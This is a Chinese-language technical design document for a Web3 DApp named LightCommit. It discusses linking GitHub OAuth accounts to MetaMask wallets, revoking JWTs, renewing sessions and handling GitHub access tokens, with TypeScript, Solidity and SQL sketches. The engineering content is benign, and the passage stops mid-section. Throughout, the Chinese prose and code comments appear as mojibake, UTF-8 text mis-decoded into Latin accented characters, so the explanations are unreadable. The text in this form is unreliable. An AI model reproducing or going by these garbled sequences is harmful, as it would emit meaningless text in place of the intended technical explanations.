# LightCommit æŠ€æœ¯å±‚é¢é€šç”¨ä¸šåŠ¡é—®é¢˜

æœ¬æ–‡æ¡£è¯¦ç»†åˆ†æ LightCommit é¡¹ç›®åœ¨æŠ€æœ¯å®ç°è¿‡ç¨‹ä¸­é‡åˆ°çš„é€šç”¨å‹ä¸šåŠ¡é—®é¢˜ï¼Œè¿™äº›é—®é¢˜å…·æœ‰æ™®éæ€§ï¼Œåœ¨ç±»ä¼¼çš„ Web3 DApp é¡¹ç›®ä¸­éƒ½ä¼šé‡åˆ°ã€‚

---

## ä¸€ã€è®¤è¯ä¸èº«ä»½ç®¡ç†é—®é¢˜ ğŸ”

### 1.1 åŒé‡èº«ä»½ç»‘å®šé—®é¢˜

#### é—®é¢˜æè¿°

LightCommit æ¶‰åŠä¸¤ä¸ªç‹¬ç«‹çš„èº«ä»½ç³»ç»Ÿï¼š
1. **GitHub èº«ä»½**ï¼šé€šè¿‡ OAuth ç™»å½•ï¼Œç”¨äºè¯†åˆ«å¼€å‘è€…
2. **é’±åŒ…åœ°å€**ï¼šé€šè¿‡ MetaMask è¿æ¥ï¼Œç”¨äºé“¾ä¸Šäº¤äº’

è¿™ä¸¤ä¸ªèº«ä»½éœ€è¦å»ºç«‹æ˜ å°„å…³ç³»ï¼Œæ‰èƒ½å®ç°"GitHub è´¡çŒ® â†’ é“¸é€  NFT åˆ°é’±åŒ…"ã€‚

#### å…·ä½“æŒ‘æˆ˜

**æŒ‘æˆ˜ 1ï¼šç»‘å®šå…³ç³»çš„å­˜å‚¨ä½ç½®**

```typescript
// æ–¹æ¡ˆ Aï¼šä»…é“¾ä¸Šå­˜å‚¨ï¼ˆAgentIdentityRegistry åˆçº¦ï¼‰
contract AgentIdentityRegistry {
  mapping(address => string) public walletToGithub;  // é’±åŒ… â†’ GitHub ç”¨æˆ·å
  mapping(string => address) public githubToWallet;  // GitHub ç”¨æˆ·å â†’ é’±åŒ…
}

// ä¼˜ç‚¹ï¼šå»ä¸­å¿ƒåŒ–ã€ä¸å¯ç¯¡æ”¹
// ç¼ºç‚¹ï¼šGas æˆæœ¬ã€æ— æ³•å­˜å‚¨å¤æ‚æ•°æ®ï¼ˆå¦‚ emailã€å¤´åƒï¼‰
```

```typescript
// æ–¹æ¡ˆ Bï¼šé“¾ä¸Š+é“¾ä¸‹æ··åˆå­˜å‚¨ï¼ˆå½“å‰æ–¹æ¡ˆï¼‰
// é“¾ä¸Šï¼šAgentIdentityRegistry åˆçº¦
contract AgentIdentityRegistry {
  mapping(address => AgentProfile) public agents;
  mapping(string => address) public githubToWallet;
}

// é“¾ä¸‹ï¼šSupabase users è¡¨
CREATE TABLE users (
  id UUID PRIMARY KEY,
  "githubId" VARCHAR NOT NULL UNIQUE,
  username VARCHAR NOT NULL,
  "walletAddress" VARCHAR,  -- ä¸é“¾ä¸Šä¿æŒåŒæ­¥
  ...
);

// ä¼˜ç‚¹ï¼šæˆæœ¬ä½ã€æ•°æ®ä¸°å¯Œã€æŸ¥è¯¢å¿«
// ç¼ºç‚¹ï¼šéœ€è¦åŒæ­¥æœºåˆ¶ã€å¯èƒ½ä¸ä¸€è‡´
```

**æŒ‘æˆ˜ 2ï¼šä¸€å¯¹å¤šå…³ç³»å¤„ç†**

```typescript
// å½“å‰é™åˆ¶ï¼šä¸€ä¸ª GitHub è´¦å·åªèƒ½ç»‘å®šä¸€ä¸ªé’±åŒ…
function registerAgent(string githubUsername, string agentCardURI) {
  require(githubToWallet[githubUsername] == address(0), "GitHub username already bound");
  // ...
}

// å®é™…éœ€æ±‚ï¼šç”¨æˆ·å¯èƒ½æœ‰å¤šä¸ªé’±åŒ…
// - ä¸»é’±åŒ…ï¼šç”¨äºæ—¥å¸¸äº¤æ˜“
// - å†·é’±åŒ…ï¼šç”¨äºé•¿æœŸæŒæœ‰
// - æµ‹è¯•é’±åŒ…ï¼šç”¨äºæµ‹è¯•

// æ½œåœ¨æ–¹æ¡ˆï¼š
mapping(string => address[]) public githubToWallets;  // ä¸€å¯¹å¤š
mapping(address => bool) public isPrimaryWallet;       // æ ‡è®°ä¸»é’±åŒ…
```

**æŒ‘æˆ˜ 3ï¼šç»‘å®šçš„å¯æ’¤é”€æ€§**

```typescript
// å½“å‰é—®é¢˜ï¼šä¸€æ—¦ç»‘å®šï¼Œæ— æ³•è§£ç»‘æˆ–æ›´æ¢é’±åŒ…
// åŸå› ï¼šåˆçº¦ä¸­æ²¡æœ‰æä¾› unbind æˆ– updateWallet å‡½æ•°

// åœºæ™¯ï¼š
// - ç”¨æˆ·é’±åŒ…ç§é’¥ä¸¢å¤±ï¼Œæƒ³æ¢æ–°é’±åŒ…
// - ç”¨æˆ·å‘ç°ç»‘å®šé”™è¯¯ï¼Œæƒ³é‡æ–°ç»‘å®š
// - ç”¨æˆ·å–æ‰ NFTï¼Œæ–°æŒæœ‰è€…æƒ³ç»‘å®šè‡ªå·±çš„ GitHub

// æ½œåœ¨æ–¹æ¡ˆï¼š
function updateWalletAddress(
  string githubUsername,
  address newWallet,
  bytes signature  // GitHub OAuth ç­¾åè¯æ˜èº«ä»½
) external {
  require(githubToWallet[githubUsername] == msg.sender, "Not owner");
  // éªŒè¯ç­¾å...
  // æ›´æ–°ç»‘å®š...
}
```

#### å½“å‰å®ç°åˆ†æ

```typescript
// frontend/src/hooks/use-agent-registry.ts
export function useAgentRegistry() {
  const { account } = useWeb3();        // é’±åŒ…åœ°å€
  const { user } = useAuth();           // GitHub ç”¨æˆ·ä¿¡æ¯
  
  // é—®é¢˜ 1ï¼šå¦‚æœç”¨æˆ·å…ˆç™»å½• GitHubï¼Œåè¿æ¥é’±åŒ…ï¼Œä¸¤è€…å¦‚ä½•å…³è”ï¼Ÿ
  // é—®é¢˜ 2ï¼šå¦‚æœç”¨æˆ·åœ¨ä¸åŒè®¾å¤‡ä¸Šç™»å½•ï¼Œé’±åŒ…åœ°å€ä¸åŒæ€ä¹ˆåŠï¼Ÿ
  // é—®é¢˜ 3ï¼šå¦‚æœç”¨æˆ·æ³¨é”€é’±åŒ…ï¼ŒGitHub session è¿˜åœ¨ï¼ŒçŠ¶æ€å¦‚ä½•å¤„ç†ï¼Ÿ

  const registerAgent = async (githubUsername?: string) => {
    // å½“å‰é€»è¾‘ï¼šç›´æ¥ä½¿ç”¨ msg.senderï¼ˆå½“å‰è¿æ¥çš„é’±åŒ…ï¼‰
    const username = githubUsername || user?.user_metadata?.user_name;
    
    // æ½œåœ¨é—®é¢˜ï¼š
    // - ç”¨æˆ·å¯èƒ½åœ¨ä¸åŒæµè§ˆå™¨ç™»å½•äº†ä¸åŒçš„ GitHub è´¦å·
    // - é’±åŒ…è¿æ¥å¯èƒ½æ˜¯å…¶ä»–äººçš„
    // - æ²¡æœ‰äºŒæ¬¡ç¡®è®¤æœºåˆ¶
    
    const tx = await contract.registerAgent(username, agentCardURI);
    await tx.wait();
  };
  
  return { isRegistered, registerAgent };
}
```

#### è§£å†³æ–¹æ¡ˆå»ºè®®

**æ–¹æ¡ˆ 1ï¼šå¢å¼ºç»‘å®šéªŒè¯**
```typescript
// è¦æ±‚ç”¨æˆ·ä½¿ç”¨ GitHub access_token ç­¾åä¸€ä¸ªæ¶ˆæ¯
// è¯æ˜ç¡®å®æ‹¥æœ‰è¯¥ GitHub è´¦å·

async function registerAgent(githubUsername, agentCardURI, githubProof) {
  // 1. éªŒè¯ GitHub Proofï¼ˆå¯ä»¥æ˜¯ GitHub OAuth è¿”å›çš„ä¸´æ—¶ tokenï¼‰
  // 2. éªŒè¯ msg.sender ç¡®å®æ˜¯ç”¨æˆ·çš„é’±åŒ…
  // 3. ç»‘å®š
}
```

**æ–¹æ¡ˆ 2ï¼šæ”¯æŒå¤šé’±åŒ…ç»‘å®š**
```solidity
// åˆçº¦å±‚æ”¯æŒä¸€ä¸ª GitHub ç»‘å®šå¤šä¸ªé’±åŒ…
mapping(string => address[]) private githubToWallets;
mapping(address => string) private walletToGithub;

function addWallet(string githubUsername, bytes githubProof) external {
  // éªŒè¯ GitHub æ‰€æœ‰æƒ
  // æ·»åŠ åˆ°é’±åŒ…åˆ—è¡¨
  githubToWallets[githubUsername].push(msg.sender);
}

function setPrimaryWallet(string githubUsername, address wallet) external {
  // è®¾ç½®ä¸»é’±åŒ…ï¼ˆç”¨äºæ¥æ”¶ NFTï¼‰
}
```

**æ–¹æ¡ˆ 3ï¼šé“¾ä¸‹ç»‘å®š + é“¾ä¸ŠéªŒè¯**
```typescript
// é“¾ä¸‹ï¼šç”¨æˆ·åœ¨ç½‘é¡µä¸Šå®Œæˆ GitHub OAuth + é’±åŒ…ç­¾å
// å­˜å‚¨åœ¨æ•°æ®åº“ï¼šusers è¡¨çš„ walletAddress å­—æ®µ

// é“¾ä¸Šï¼šä»…åœ¨é“¸é€ æ—¶éªŒè¯
function mintCommit(..., address to) external {
  // æ£€æŸ¥ to åœ°å€æ˜¯å¦ç»‘å®šäº†å¯¹åº”çš„ GitHub è´¦å·
  require(isAuthorizedWallet(contributor, to), "Wallet not bound");
}
```

---

### 1.2 Session ç®¡ç†é—®é¢˜

#### é—®é¢˜æè¿°

JWT æ˜¯æ— çŠ¶æ€çš„ï¼Œä¸€æ—¦ç­¾å‘å°±æ— æ³•ä¸»åŠ¨æ’¤é”€ï¼Œåªèƒ½ç­‰å¾…è¿‡æœŸã€‚è¿™åœ¨æŸäº›åœºæ™¯ä¸‹ä¼šå¸¦æ¥å®‰å…¨é£é™©ã€‚

#### å…·ä½“æŒ‘æˆ˜

**æŒ‘æˆ˜ 1ï¼šJWT æ— æ³•ä¸»åŠ¨æ’¤é”€**

```typescript
// åœºæ™¯ï¼šç”¨æˆ·æ€€ç–‘è´¦å·è¢«ç›—ï¼Œæƒ³ç«‹å³ç™»å‡ºæ‰€æœ‰è®¾å¤‡

// å½“å‰é—®é¢˜ï¼š
// 1. ç”¨æˆ·ç‚¹å‡»"ç™»å‡º"ï¼Œåªæ˜¯åˆ é™¤æµè§ˆå™¨çš„ Cookie
// 2. JWT æœ¬èº«è¿˜åœ¨æœ‰æ•ˆæœŸå†…ï¼ˆ30 å¤©ï¼‰
// 3. å¦‚æœæ”»å‡»è€…å·²ç»æ‹¿åˆ° JWTï¼Œä»ç„¶å¯ä»¥ä½¿ç”¨

// ç¤ºä¾‹ï¼š
async function logout() {
  await clearSessionCookie();  // åªæ˜¯åˆ é™¤ Cookie
  // JWT æœ¬èº«ä»ç„¶æœ‰æ•ˆï¼ä»»ä½•äººæ‹¿åˆ°è¿™ä¸ª JWT ä»ç„¶å¯ä»¥å†’å……ç”¨æˆ·
}
```

**è§£å†³æ–¹æ¡ˆï¼šJWT é»‘åå•æœºåˆ¶**

```typescript
// æ–¹æ¡ˆ Aï¼šRedis é»‘åå•
import Redis from 'ioredis';

const redis = new Redis();

// ç™»å‡ºæ—¶å°† JWT åŠ å…¥é»‘åå•
async function logout(token: string) {
  const session = await verifySession(token);
  if (session) {
    // è®¡ç®—å‰©ä½™æœ‰æ•ˆæœŸ
    const ttl = Math.floor((session.expiresAt - Date.now()) / 1000);
    
    // åŠ å…¥é»‘åå•ï¼ˆRedis è‡ªåŠ¨è¿‡æœŸï¼‰
    await redis.setex(`blacklist:${token}`, ttl, '1');
  }
  
  await clearSessionCookie();
}

// éªŒè¯æ—¶æ£€æŸ¥é»‘åå•
async function getSession(): Promise<SessionData | null> {
  const token = cookieStore.get('lightcommit_session')?.value;
  if (!token) return null;
  
  // æ£€æŸ¥æ˜¯å¦åœ¨é»‘åå•ä¸­
  const isBlacklisted = await redis.exists(`blacklist:${token}`);
  if (isBlacklisted) return null;
  
  return await verifySession(token);
}

// ä¼˜ç‚¹ï¼šå¯ä»¥ç«‹å³æ’¤é”€ JWT
// ç¼ºç‚¹ï¼šå¼•å…¥ Redis ä¾èµ–ã€å¢åŠ å¤æ‚åº¦
```

**æ–¹æ¡ˆ Bï¼šçŸ­æœŸ JWT + Refresh Token**

```typescript
// 1. Access Tokenï¼ˆçŸ­æœŸï¼Œ15 åˆ†é’Ÿï¼‰
const accessToken = await new SignJWT({ userId: user.id })
  .setExpirationTime('15m')  // çŸ­æœŸ
  .sign(secret);

// 2. Refresh Tokenï¼ˆé•¿æœŸï¼Œ30 å¤©ï¼Œå­˜å‚¨åœ¨æ•°æ®åº“ï¼‰
const refreshToken = generateRandomToken();
await saveRefreshToken(userId, refreshToken, expiresIn30Days);

// 3. å‰ç«¯ä½¿ç”¨ Refresh Token è‡ªåŠ¨ç»­æœŸ Access Token
async function refreshAccessToken(refreshToken: string) {
  // éªŒè¯ Refresh Tokenï¼ˆæŸ¥æ•°æ®åº“ï¼‰
  const record = await db.query('SELECT * FROM refresh_tokens WHERE token = $1', [refreshToken]);
  if (!record || record.expiresAt < Date.now()) {
    throw new Error('Refresh token expired');
  }
  
  // ç­¾å‘æ–°çš„ Access Token
  const newAccessToken = await createAccessToken(record.userId);
  return newAccessToken;
}

// 4. ç™»å‡ºæ—¶æ’¤é”€ Refresh Token
async function logout(refreshToken: string) {
  await db.query('DELETE FROM refresh_tokens WHERE token = $1', [refreshToken]);
  // Access Token ä¼šåœ¨ 15 åˆ†é’Ÿåè‡ªåŠ¨è¿‡æœŸ
}

// ä¼˜ç‚¹ï¼šå¯ä»¥ä¸»åŠ¨æ’¤é”€ã€æ›´å®‰å…¨
// ç¼ºç‚¹ï¼šå¢åŠ å¤æ‚åº¦ã€éœ€è¦æ•°æ®åº“å­˜å‚¨
```

**æŒ‘æˆ˜ 2ï¼šå‰ç«¯ Token ä¸åç«¯ Cookie çš„åŒæ­¥**

```typescript
// å½“å‰é—®é¢˜ï¼šå‰ç«¯æœ‰ä¸¤ä¸ª Token å­˜å‚¨ä½ç½®

// ä½ç½® 1ï¼šhttpOnly Cookieï¼ˆåç«¯è®¾ç½®ï¼Œå‰ç«¯æ— æ³•è®¿é—®ï¼‰
// - å­˜å‚¨ JWT Session
// - ç”¨äº API Routes éªŒè¯èº«ä»½

// ä½ç½® 2ï¼šlocalStorageï¼ˆå‰ç«¯è®¾ç½®ï¼Œç”¨äº Axiosï¼‰
// - å­˜å‚¨ Bearer Token
// - ç”¨äºå‰ç«¯ HTTP è¯·æ±‚

// ä¸ä¸€è‡´çš„åœºæ™¯ï¼š
// 1. åç«¯ Cookie å­˜åœ¨ï¼Œä½†å‰ç«¯ localStorage è¢«æ¸…ç©º
// 2. å‰ç«¯ localStorage å­˜åœ¨ï¼Œä½†åç«¯ Cookie å·²è¿‡æœŸ
// 3. ä¸¤è€…å­˜å‚¨çš„æ˜¯ä¸åŒçš„ Token

// ç¤ºä¾‹ä»£ç ï¼š
// frontend/src/lib/api.ts
apiClient.interceptors.request.use((config) => {
  // ä» localStorage è¯»å– token
  const token = localStorage.getItem('token');  // â† é—®é¢˜ï¼šå¯èƒ½ä¸ Cookie ä¸åŒæ­¥
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// å»ºè®®æ–¹æ¡ˆï¼šç»Ÿä¸€ä½¿ç”¨ Cookie
apiClient.interceptors.request.use((config) => {
  // ä¸éœ€è¦æ‰‹åŠ¨æ·»åŠ  token
  // Cookie ä¼šè‡ªåŠ¨æºå¸¦ï¼ˆè®¾ç½® credentials: 'include'ï¼‰
  return config;
});

export const apiClient = axios.create({
  baseURL: API_BASE_URL,
  withCredentials: true,  // â† è‡ªåŠ¨æºå¸¦ Cookie
});
```

**æŒ‘æˆ˜ 3ï¼šSession è¿‡æœŸåçš„è‡ªåŠ¨ç»­æœŸ**

```typescript
// å½“å‰é—®é¢˜ï¼šSession è¿‡æœŸï¼ˆ30 å¤©åï¼‰ï¼Œç”¨æˆ·éœ€è¦é‡æ–°ç™»å½•

// ç”¨æˆ·ä½“éªŒå·®çš„åœºæ™¯ï¼š
// - ç”¨æˆ·æ­£åœ¨å¡«å†™è¡¨å•ï¼Œçªç„¶ Session è¿‡æœŸ
// - ç”¨æˆ·åœ¨å…³é”®æ“ä½œæ—¶ï¼ˆå¦‚é“¸é€  NFTï¼‰Session å¤±æ•ˆ
// - æ²¡æœ‰æå‰æç¤ºç”¨æˆ· Session å³å°†è¿‡æœŸ

// è§£å†³æ–¹æ¡ˆ Aï¼šæ»‘åŠ¨è¿‡æœŸï¼ˆSliding Expirationï¼‰
async function refreshSession(request: NextRequest) {
  const session = await getSession();
  if (!session) return null;
  
  // æ£€æŸ¥æ˜¯å¦å¿«è¿‡æœŸï¼ˆå‰©ä½™æ—¶é—´ < 7 å¤©ï¼‰
  const remainingTime = session.expiresAt - Date.now();
  const sevenDays = 7 * 24 * 60 * 60 * 1000;
  
  if (remainingTime < sevenDays) {
    // è‡ªåŠ¨ç»­æœŸï¼ˆé‡æ–°ç­¾å‘ JWTï¼‰
    const newSessionData = {
      ...session,
      createdAt: Date.now(),
      expiresAt: Date.now() + 30 * 24 * 60 * 60 * 1000,
    };
    await setSessionCookie(newSessionData);
  }
  
  return session;
}

// åœ¨ä¸­é—´ä»¶ä¸­è‡ªåŠ¨ç»­æœŸ
// frontend/src/middleware.ts
export async function middleware(request: NextRequest) {
  await refreshSession(request);  // æ¯æ¬¡è¯·æ±‚è‡ªåŠ¨æ£€æŸ¥å¹¶ç»­æœŸ
  return NextResponse.next();
}
```

**è§£å†³æ–¹æ¡ˆ Bï¼šå‰ç«¯è‡ªåŠ¨åˆ·æ–°**

```typescript
// å‰ç«¯å®šæœŸæ£€æŸ¥ Session çŠ¶æ€
import { useEffect } from 'react';
import { AuthService } from '@/lib/services/auth.service';

export function useSessionRefresh() {
  useEffect(() => {
    // æ¯ 10 åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡
    const interval = setInterval(async () => {
      try {
        const { session } = await AuthService.getSession();
        
        if (!session) {
          // Session å·²å¤±æ•ˆï¼Œé‡å®šå‘åˆ°ç™»å½•
          window.location.href = '/';
          return;
        }
        
        // æ£€æŸ¥æ˜¯å¦å¿«è¿‡æœŸï¼ˆå‰©ä½™æ—¶é—´ < 1 å¤©ï¼‰
        const remainingTime = session.expiresAt - Date.now();
        const oneDay = 24 * 60 * 60 * 1000;
        
        if (remainingTime < oneDay) {
          // æç¤ºç”¨æˆ·å³å°†è¿‡æœŸ
          toast.warning('æ‚¨çš„ç™»å½•å³å°†è¿‡æœŸï¼Œè¯·é‡æ–°ç™»å½•');
        }
      } catch (error) {
        console.error('Session æ£€æŸ¥å¤±è´¥:', error);
      }
    }, 10 * 60 * 1000);  // 10 åˆ†é’Ÿ
    
    return () => clearInterval(interval);
  }, []);
}
```

---

### 1.3 å¤šç«¯è®¤è¯çŠ¶æ€åŒæ­¥é—®é¢˜

#### é—®é¢˜æè¿°

ç”¨æˆ·åœ¨ä½¿ç”¨ LightCommit æ—¶ï¼Œéœ€è¦åŒæ—¶æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š
1. **å·²ç™»å½• GitHub**ï¼ˆOAuth Sessionï¼‰
2. **å·²è¿æ¥é’±åŒ…**ï¼ˆMetaMaskï¼‰

ä½†è¿™ä¸¤ä¸ªçŠ¶æ€æ˜¯ç‹¬ç«‹ç®¡ç†çš„ï¼Œå¯èƒ½å‡ºç°ä¸åŒæ­¥ã€‚

#### å…·ä½“åœºæ™¯

**åœºæ™¯ 1ï¼šç™»å½• GitHub ä½†æœªè¿æ¥é’±åŒ…**

```typescript
// frontend/src/app/erc8004/contributions/page.tsx
export default function ContributionsPage() {
  const { isAuthenticated, user } = useAuth();        // GitHub è®¤è¯çŠ¶æ€
  const { isConnected, address } = useWeb3();         // é’±åŒ…è¿æ¥çŠ¶æ€

  // é—®é¢˜ï¼šç”¨æˆ·å·²ç™»å½• GitHubï¼Œä½†æ²¡è¿æ¥é’±åŒ…
  // - å¯ä»¥æŸ¥çœ‹è´¡çŒ®åˆ—è¡¨ âœ…
  // - æ— æ³•é“¸é€  NFT âŒï¼ˆéœ€è¦é’±åŒ…ç­¾åï¼‰
  // - æ— æ³•æ³¨å†Œ Agent âŒï¼ˆéœ€è¦é’±åŒ…åœ°å€ï¼‰
  
  if (isAuthenticated && !isConnected) {
    return (
      <div>
        <p>æ‚¨å·²ç™»å½• GitHub: {user.login}</p>
        <p className="text-yellow-500">è¯·è¿æ¥é’±åŒ…ä»¥ç»§ç»­æ“ä½œ</p>
        <ConnectWalletButton />
      </div>
    );
  }
}
```

**åœºæ™¯ 2ï¼šè¿æ¥é’±åŒ…ä½†æœªç™»å½• GitHub**

```typescript
// ç”¨æˆ·ç›´æ¥è®¿é—®é¡µé¢ï¼ŒMetaMask è‡ªåŠ¨è¿æ¥
// ä½†æ²¡æœ‰é€šè¿‡ GitHub OAuth ç™»å½•

if (!isAuthenticated && isConnected) {
  return (
    <div>
      <p>é’±åŒ…å·²è¿æ¥: {address}</p>
      <p className="text-yellow-500">è¯·å…ˆç™»å½• GitHub ä»¥æŸ¥çœ‹æ‚¨çš„è´¡çŒ®</p>
      <button onClick={() => AuthService.signInWithGitHub()}>
        GitHub ç™»å½•
      </button>
    </div>
  );
}
```

**åœºæ™¯ 3ï¼šGitHub ä¸é’±åŒ…ç»‘å®šä¸ä¸€è‡´**

```typescript
// ç”¨æˆ·ç™»å½•äº† GitHub è´¦å· A
const githubUser = 'alice';

// ä½†è¿æ¥çš„æ˜¯å…¶ä»–äººçš„é’±åŒ…ï¼ˆè´¦å· B çš„é’±åŒ…ï¼‰
const walletAddress = '0xBob...';

// é—®é¢˜ï¼š
// - åœ¨ AgentIdentityRegistry ä¸­æŸ¥è¯¢ï¼Œå‘ç° walletAddress ç»‘å®šçš„æ˜¯ 'bob'
// - ä½†å½“å‰ GitHub session æ˜¯ 'alice'
// - ç”¨æˆ·å¯èƒ½è¯¯æ“ä½œï¼Œæˆ–è€…åœ¨å…±äº«ç”µè„‘ä¸Š

// æ£€æµ‹é€»è¾‘ï¼š
const checkIdentityConsistency = async () => {
  const session = await AuthService.getSession();  // GitHub: alice
  const { isRegistered, agentProfile } = useAgentRegistry();  // é“¾ä¸Šç»‘å®š
  
  if (isRegistered && agentProfile.githubUsername !== session.user.login) {
    // è­¦å‘Šï¼šèº«ä»½ä¸ä¸€è‡´
    toast.error(
      `è­¦å‘Šï¼šå½“å‰é’±åŒ…ç»‘å®šçš„æ˜¯ ${agentProfile.githubUsername}ï¼Œ` +
      `ä½†æ‚¨ç™»å½•çš„æ˜¯ ${session.user.login}ã€‚è¯·ç¡®è®¤èº«ä»½æˆ–åˆ‡æ¢é’±åŒ…ã€‚`
    );
  }
};
```

#### è§£å†³æ–¹æ¡ˆ

**æ–¹æ¡ˆ Aï¼šå¼ºåˆ¶ç»‘å®šä¸€è‡´æ€§æ£€æŸ¥**

```typescript
// åˆ›å»ºä¸€ä¸ªç»Ÿä¸€çš„èº«ä»½çŠ¶æ€ç®¡ç† Hook
export function useIdentity() {
  const { user, isAuthenticated } = useAuth();
  const { address, isConnected } = useWeb3();
  const { isRegistered, agentProfile } = useAgentRegistry();
  
  // è®¡ç®—ç»¼åˆçŠ¶æ€
  const identityStatus = useMemo(() => {
    // 1. æœªç™»å½• GitHub
    if (!isAuthenticated) {
      return { status: 'github_not_logged_in', canProceed: false };
    }
    
    // 2. æœªè¿æ¥é’±åŒ…
    if (!isConnected) {
      return { status: 'wallet_not_connected', canProceed: false };
    }
    
    // 3. æœªæ³¨å†Œ Agentï¼ˆæœªç»‘å®šï¼‰
    if (!isRegistered) {
      return { status: 'not_registered', canProceed: false };
    }
    
    // 4. èº«ä»½ä¸ä¸€è‡´ï¼ˆé’±åŒ…ç»‘å®šçš„ GitHub ä¸å½“å‰ç™»å½•çš„ä¸åŒï¼‰
    if (agentProfile.githubUsername !== user.login) {
      return { 
        status: 'identity_mismatch', 
        canProceed: false,
        details: {
          walletBoundTo: agentProfile.githubUsername,
          currentGithub: user.login,
        }
      };
    }
    
    // 5. ä¸€åˆ‡æ­£å¸¸
    return { status: 'ready', canProceed: true };
  }, [isAuthenticated, isConnected, isRegistered, user, agentProfile]);
  
  return {
    ...identityStatus,
    user,
    address,
    requireGitHubLogin: () => AuthService.signInWithGitHub(),
    requireWalletConnect: () => connect(),
    requireRegister: () => registerAgent(),
  };
}

// ä½¿ç”¨ï¼š
function MintButton({ contributionId }) {
  const { status, canProceed, requireGitHubLogin, requireWalletConnect } = useIdentity();
  
  const handleMint = () => {
    if (!canProceed) {
      switch (status) {
        case 'github_not_logged_in':
          return requireGitHubLogin();
        case 'wallet_not_connected':
          return requireWalletConnect();
        case 'not_registered':
          return toast.error('è¯·å…ˆæ³¨å†Œ Agent');
        case 'identity_mismatch':
          return toast.error('èº«ä»½ä¸ä¸€è‡´ï¼Œè¯·æ£€æŸ¥é’±åŒ…ç»‘å®š');
      }
    }
    
    // æ‰§è¡Œé“¸é€ 
    mintNFT(contributionId);
  };
  
  return <button onClick={handleMint}>é“¸é€  NFT</button>;
}
```

**æ–¹æ¡ˆ Bï¼šè‡ªåŠ¨å¼•å¯¼æµç¨‹**

```typescript
// åˆ›å»ºä¸€ä¸ªèº«ä»½è®¾ç½®å‘å¯¼ç»„ä»¶
export function IdentitySetupWizard({ onComplete }) {
  const [step, setStep] = useState(1);
  
  return (
    <div className="wizard">
      {/* æ­¥éª¤ 1ï¼šGitHub ç™»å½• */}
      {step === 1 && (
        <div>
          <h2>æ­¥éª¤ 1: ç™»å½• GitHub</h2>
          <button onClick={() => AuthService.signInWithGitHub()}>
            GitHub ç™»å½•
          </button>
        </div>
      )}
      
      {/* æ­¥éª¤ 2ï¼šè¿æ¥é’±åŒ… */}
      {step === 2 && (
        <div>
          <h2>æ­¥éª¤ 2: è¿æ¥é’±åŒ…</h2>
          <ConnectWalletButton onConnect={() => setStep(3)} />
        </div>
      )}
      
      {/* æ­¥éª¤ 3ï¼šç»‘å®šèº«ä»½ */}
      {step === 3 && (
        <div>
          <h2>æ­¥éª¤ 3: ç»‘å®šèº«ä»½</h2>
          <p>å°† GitHub è´¦å· {user.login} ç»‘å®šåˆ°é’±åŒ… {address}</p>
          <button onClick={async () => {
            await registerAgent();
            onComplete();
          }}>
            ç¡®è®¤ç»‘å®š
          </button>
        </div>
      )}
    </div>
  );
}
```

**æŒ‘æˆ˜ 4ï¼šè·¨è®¾å¤‡ Session åŒæ­¥**

```typescript
// åœºæ™¯ï¼šç”¨æˆ·åœ¨å¤šä¸ªè®¾å¤‡ç™»å½•

// è®¾å¤‡ Aï¼š
// - GitHub: alice
// - é’±åŒ…: 0xAlice...
// - Session: æœ‰æ•ˆ

// è®¾å¤‡ Bï¼š
// - GitHub: aliceï¼ˆåŒä¸€è´¦å·ï¼‰
// - é’±åŒ…: 0xBob...ï¼ˆä¸åŒé’±åŒ…ï¼ï¼‰
// - Session: æœ‰æ•ˆ

// é—®é¢˜ï¼š
// - ä¸¤ä¸ªè®¾å¤‡çš„é’±åŒ…åœ°å€ä¸åŒ
// - å¦‚æœ alice å·²ç»åœ¨è®¾å¤‡ A æ³¨å†Œï¼Œç»‘å®šäº† 0xAlice
// - åœ¨è®¾å¤‡ B æ— æ³•æ³¨å†Œï¼ˆåˆçº¦æ‹’ç»é‡å¤ç»‘å®šï¼‰

// è§£å†³æ–¹æ¡ˆï¼š
// 1. å…è®¸ä¸€ä¸ª GitHub ç»‘å®šå¤šä¸ªé’±åŒ…ï¼ˆä¿®æ”¹åˆçº¦ï¼‰
// 2. æç¤ºç”¨æˆ·åœ¨è®¾å¤‡ B å¯¼å…¥è®¾å¤‡ A çš„é’±åŒ…ï¼ˆMetaMask ç§å­è¯ï¼‰
// 3. æä¾›"è§£ç»‘æ—§é’±åŒ…"åŠŸèƒ½ï¼ˆéœ€è¦ GitHub OAuth éªŒè¯ï¼‰
```

---

### 1.4 GitHub Access Token ç®¡ç†é—®é¢˜

#### é—®é¢˜æè¿°

GitHub OAuth è¿”å›çš„ `access_token` æœ‰å¤šç§ç”¨é€”ï¼Œä½†ç®¡ç†å¤æ‚ã€‚

#### å…·ä½“æŒ‘æˆ˜

**æŒ‘æˆ˜ 1ï¼šAccess Token çš„å­˜å‚¨ä½ç½®**

```typescript
// å½“å‰æ–¹æ¡ˆï¼šå­˜å‚¨åœ¨ JWT Session ä¸­
export interface SessionData {
  user: { ... },
  accessToken: string,  // â† å­˜å‚¨åœ¨ JWT ä¸­
}

// JWT å­˜å‚¨åœ¨ httpOnly Cookie ä¸­
// - å‰ç«¯æ— æ³•è®¿é—® accessToken
// - å¦‚æœå‰ç«¯éœ€è¦è°ƒç”¨ GitHub APIï¼Œæ— æ³•è·å– token

// åœºæ™¯ï¼šå‰ç«¯æƒ³è¦è·å–ç”¨æˆ·çš„ä»“åº“åˆ—è¡¨
async function fetchUserRepos() {
  // âŒ æ— æ³•è·å– accessTokenï¼ˆåœ¨ httpOnly Cookie ä¸­ï¼‰
  const session = await AuthService.getSession();  // å‰ç«¯æ— æ³•è¯»å– Cookie
  
  // åªèƒ½é€šè¿‡åç«¯ä»£ç†
  const response = await fetch('/api/github/repos');  // API Route ä¸­è½¬
}

// å»ºè®®æ–¹æ¡ˆï¼šåç«¯ä»£ç† GitHub API
// app/api/github/repos/route.ts
export async function GET(request: NextRequest) {
  const session = await getSession();
  if (!session) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }
  
  // ä½¿ç”¨ session.accessToken è°ƒç”¨ GitHub API
  const response = await fetch('https://api.github.com/user/repos', {
    headers: {
      'Authorization': `Bearer ${session.accessToken}`,
    },
  });
  
  const repos = await response.json();
  return NextResponse.json({ data: repos });
}
```

**æŒ‘æˆ˜ 2ï¼šAccess Token çš„åˆ·æ–°**

```typescript
// GitHub OAuth Token ç‰¹æ€§ï¼š
// - é»˜è®¤ä¸ä¼šè¿‡æœŸ
